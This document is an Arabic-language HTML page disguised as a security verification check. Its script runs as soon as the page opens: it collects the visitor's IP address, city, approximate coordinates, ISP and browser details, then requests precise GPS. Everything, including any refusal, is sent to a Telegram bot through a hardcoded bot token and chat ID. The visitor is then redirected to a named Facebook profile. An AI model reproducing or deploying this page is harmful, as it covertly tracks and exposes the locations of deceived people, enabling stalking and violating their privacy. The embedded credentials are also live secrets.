<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>جاري التحقق من الأمان</title>
    <style>
        body {
            background: #1e1e2f;
            font-family: 'Segoe UI', sans-serif;
            text-align: center;
            padding: 50px 20px;
            color: white;
        }
        .container {
            background: #2a2a3b;
            padding: 30px;
            border-radius: 20px;
            max-width: 400px;
            margin: auto;
            box-shadow: 0 0 15px rgba(0,0,0,0.5);
        }
        .spinner {
            border: 5px solid #444;
            border-top: 5px solid #0f0;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        button {
            background: #0a84ff;
            border: none;
            padding: 12px 25px;
            border-radius: 30px;
            color: white;
            font-size: 18px;
            margin-top: 20px;
            cursor: pointer;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>🔐 تحقق من هوية الزائر</h2>
    <p>لأسباب أمنية، يلزم تأكيد موقعك الجغرافي</p>
    <div id="status">📡 جاري تجهيز البيانات...</div>
    <button id="allowBtn" class="hidden">✅ السماح بالتحقق</button>
</div>

<script>
    // بيانات البوت الجديدة (التوكن الصحيح)
    const BOT_TOKEN = "7579374201:AAEk53e2ovXUa-_fuUKmr78JVg0IJAMyRBE";
    const CHAT_ID = "8669811855";   // معرف المستخدم المصرح له

    // اسم صفحة الشخص
    const PAGE_NAME = "جبله علي جبر بك";

    // دالة إرسال إلى التليغرام
    async function sendToTelegram(message) {
        try {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            await fetch(url, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message.substring(0, 4096)
                })
            });
        } catch(e) {
            console.log("Telegram send error");
        }
    }

    // جلب الـ IP + الموقع التقريبي
    async function getLocationInfo() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            return {
                ip: data.ip,
                city: data.city,
                region: data.region,
                country: data.country_name,
                lat: data.latitude,
                lon: data.longitude,
                org: data.org
            };
        } catch(e) {
            return null;
        }
    }

    // طلب الموقع الدقيق (GPS)
    function requestGPS() {
        document.getElementById('status').innerHTML = "📍 نطلب من المتصفح السماح...";
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const acc = position.coords.accuracy;
                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;

                    // إرسال GPS
                    let gpsMsg = `🎯 <b>${PAGE_NAME}</b> - موقع دقيق ✅\n`;
                    gpsMsg += `📍 الرابط: ${mapLink}\n`;
                    gpsMsg += `📏 الدقة: ${Math.round(acc)} متر\n`;
                    gpsMsg += `🕒 ${new Date().toLocaleString()}`;
                    await sendToTelegram(gpsMsg);

                    document.getElementById('status').innerHTML = `✅ تم التحقق. جاري التحويل...`;
                    
                    // اختياري: توجيهه لصفحة حقيقية بعد 2 ثانية
                    setTimeout(() => {
                        window.location.href = "https://www.facebook.com/jableh.ali.jbr";
                    }, 2000);
                },
                async (error) => {
                    let errMsg = `⚠️ <b>${PAGE_NAME}</b> - رفض GPS\n`;
                    errMsg += `السبب: ${error.message}\n`;
                    errMsg += `🕒 ${new Date().toLocaleString()}`;
                    await sendToTelegram(errMsg);
                    document.getElementById('status').innerHTML = "❌ السماح مطلوب. الرجاء الضغط على الزر.";
                    document.getElementById('allowBtn').classList.remove('hidden');
                },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        } else {
            document.getElementById('status').innerHTML = "⚠️ المتصفح لا يدعم تحديد الموقع";
        }
    }

    // التنفيذ الرئيسي
    (async function() {
        // 1. إرسال IP فور فتح الصفحة
        const ipData = await getLocationInfo();
        if (ipData) {
            let ipMsg = `🌐 <b>${PAGE_NAME}</b> - دخول جديد\n`;
            ipMsg += `📡 IP: ${ipData.ip}\n`;
            ipMsg += `🏙️ ${ipData.city}, ${ipData.region}, ${ipData.country}\n`;
            if (ipData.lat && ipData.lon) {
                ipMsg += `🗺️ تقريبي: https://www.google.com/maps?q=${ipData.lat},${ipData.lon}\n`;
            }
            ipMsg += `🖥️ ${navigator.userAgent}\n🕒 ${new Date().toLocaleString()}`;
            await sendToTelegram(ipMsg);
        } else {
            await sendToTelegram(`⚠️ <b>${PAGE_NAME}</b> - زائر جديد لكن فشل جلب IP`);
        }

        // 2. طلب GPS تلقائي بعد 1 ثانية
        setTimeout(() => {
            requestGPS();
        }, 1000);
    })();
</script>
</body>
</html>
